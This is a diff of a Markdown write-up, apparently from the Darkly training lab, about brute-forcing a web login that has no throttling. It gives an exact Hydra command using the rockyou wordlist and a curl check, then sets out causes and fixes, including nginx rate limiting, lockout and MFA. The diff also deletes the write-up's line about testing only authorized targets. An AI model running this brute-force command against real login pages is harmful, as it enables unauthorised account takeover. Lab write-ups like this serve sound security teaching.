@@ -5,19 +5,26 @@ Step-by-step discovery process
 
 Initial reconnaissance
 
-Visited http://192.168.1.16/index.php?page=signin and inspected the login form with browser devtools / proxy.
+● Visited http://192.168.1.16/index.php?page=signin
+  and inspected the login form with browser devtools / proxy.
 
-Noted form parameters: username, password.
+● Noted form parameters: username, password.
 
-Observed the application returns a consistent failure marker: images/WrongAnswer.gif.
+● Observed the application returns a consistent
+  failure marker: images/WrongAnswer.gif.
 
-Performed several manual wrong attempts — no CAPTCHA, no progressive delay, no account lockout.
+● Performed several manual wrong attempts — no CAPTCHA,
+  no progressive delay, no account lockout.
 
 Identified the vulnerable behaviour
 
-Predictable failure response (easy to detect success vs failure).
+● Predictable failure response (easy to detect success 
+  or failure).
 
-Login accepts repeated requests without throttling — suitable for automated brute force.
+● Login accepts repeated requests without throttling
+  suitable for automated brute force.
+
+
 
 How I Exploited It
 
@@ -31,61 +38,59 @@ wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Data
 tar -xvzf rockyou.txt.tar.gz
 # result: ~/wordlists/rockyou.txt
 
-
 Hydra command (exact)
-
 hydra -l admin -P ~/wordlists/rockyou.txt -F -o hydra.log 192.168.1.16 http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif"
 
-
--l admin → single username admin (use -L for username list).
-
--P → password list.
-
--F → stop on first success.
-
-http-get-form with F= pointing to failure marker (images/WrongAnswer.gif).
+• -l admin → single username admin (use -L for username
+  list).
+• -P → password list.
+• -F → stop on first success.
+• http-get-form with F= pointing to failure marker(
+  images/WrongAnswer.gif).
 
 Manual verification (curl)
-
 # replace PASSWORD with candidate from hydra.log
 curl -i "http://192.168.1.16/index.php?page=signin&username=admin&password=PASSWORD&Login=Login"
-
-
-Confirm success by absence of images/WrongAnswer.gif, presence of authenticated content or redirect.
+• Confirm success by absence of images/WrongAnswer.gif,
+  presence of authenticated content or redirect.
 
 Artifacts to include in Resources
 
-hydra.log (hydra output)
+• hydra.log (hydra output).
+• proof_curl.txt (curl response demonstrating success)
+• screenshot_failed.png (show WrongAnswer.gif)
+• screenshot_success.png (show authenticated page)
 
-proof_curl.txt (curl response demonstrating success)
 
-screenshot_failed.png (shows WrongAnswer.gif)
-
-screenshot_success.png (authenticated page)
-
-Ethics: Only test on authorized targets (your Darkly lab). Do not run these against systems without permission.
 
 Why It Works
 
 Underlying vulnerability explanation
 
-Predictable failure fingerprint: The app returns a unique string/image on failed login (images/WrongAnswer.gif) so tools can reliably detect failure vs success.
+● Predictable failure fingerprint: The app returns a unique
+  string/image on failed login (images/WrongAnswer.gif) so tools can reliably detect failure vs success.
 
-No rate limiting / account lockout: The application accepts unlimited attempts from the same IP (or distributed ones) without blocking.
+● No rate limiting / account lockout: The application
+  accepts unlimited attempts from the same IP (or distributed ones) without blocking.
 
-Credentials in GET (exposed): Sending credentials in the URL increases exposure (logs, proxy history).
+● Credentials in GET (exposed): Sending credentials in the
+  URL increases exposure (logs, proxy history).
 
-Weak password policy / common passwords: Accounts may use easily guessed passwords (rockyou matches).
+● Weak password policy / common passwords: Accounts may use
+  easily guessed passwords (rockyou matches).
 
-No bot mitigation: No CAPTCHA, MFA, or behavioral checks to block automated tools.
+● No bot mitigation: No CAPTCHA, MFA, or behavioral checks
+  to block automated tools.
 
 Technical flow:
-
 Attacker tools -> repeated requests with different passwords
 ↓
 Server responds with same failure marker each time
 ↓
 Tool recognizes missing marker -> reports success
+
+
+
 
 How to Fix It
 
@@ -93,10 +98,9 @@ Security recommendations (short & actionable)
 
 Immediate / short-term
 
-Block rapid attempts (rate limit)
-Nginx example (basic):
-
-limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;
+1•Block rapid attempts (rate limit)
+  Nginx example (basic):
+    limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;
 server {
   location = /index.php {
     if ($arg_page = "signin") {
@@ -105,51 +109,39 @@ server {
   }
 }
 
-
-Use POST for login (do not send credentials in URL).
-
-Make error messages generic (do not reveal if username exists).
-
-Add CAPTCHA / bot challenge after N failed attempts (e.g., after 3).
-
-Temporary IP blocking / Fail2Ban for repeated failures.
+2•Use POST for login (do not send credentials in URL).
+3•Make error messages generic (do not reveal if username
+  exists).
+4•Add CAPTCHA / bot challenge after N failed attempts (e.g.,
+  after 3).
+5•Temporary IP blocking / Fail2Ban for repeated failures.
 
 Medium / long-term
 
-Per-account throttling & progressive lockout (example: after 5 fails lock for 15 minutes or increase delay).
-Simple pseudocode:
-
-if ($user->locked_until && now < $user->locked_until) deny();
+1•Per-account throttling & progressive lockout (example:
+  after 5 fails lock for 15 minutes or increase delay).
+  Simple pseudocode:
+  if ($user->locked_until && now < $user->locked_until) deny();
 if (password_verify($pw,$hash)) reset_failed();
 else increment_failed(); if (failed >=5) lock(15min);
 
+2•Enforce strong passwords & check against breached lists at
+  registration.
+3•Multi-Factor Authentication (MFA) for sensitive accounts.
 
-Enforce strong passwords & check against breached lists at registration.
+4•Use secure password hashing (Argon2id / bcrypt).
 
-Multi-Factor Authentication (MFA) for sensitive accounts.
+5•Logging & alerting for credential-stuffing patterns
+  integrate with SIEM.
 
-Use secure password hashing (Argon2id / bcrypt).
-
-Logging & alerting for credential-stuffing patterns; integrate with SIEM.
-
-WAF rules to detect/mitigate automated attacks and block unusual request rates.
+6•Use WAF rules to detect/mitigate automated attacks and
+  block unusual request rates.
 
 Testing after fixes
+• Re-run the hydra command to confirm it fails/gets blocked.
 
-Re-run the hydra command to confirm it fails/gets blocked.
+• Verify CAPTCHA or lockout triggers after threshold.
 
-Verify CAPTCHA or lockout triggers after threshold.
+• Confirm credentials are not logged in URLs (POST used).
 
-Confirm credentials are not logged in URLs (POST used).
-
-Check logs/alerts are generated on brute-force attempts.
-
-References / Files to include in Resources/
-
-BRUTE_FORCE.md (this doc)
-
-hydra.log, proof_curl.txt
-
-screenshot_failed.png, screenshot_success.png
-
-fix_summary.txt (short bullet list for ops)
+• Check logs/alerts are generated on brute-force attempts.
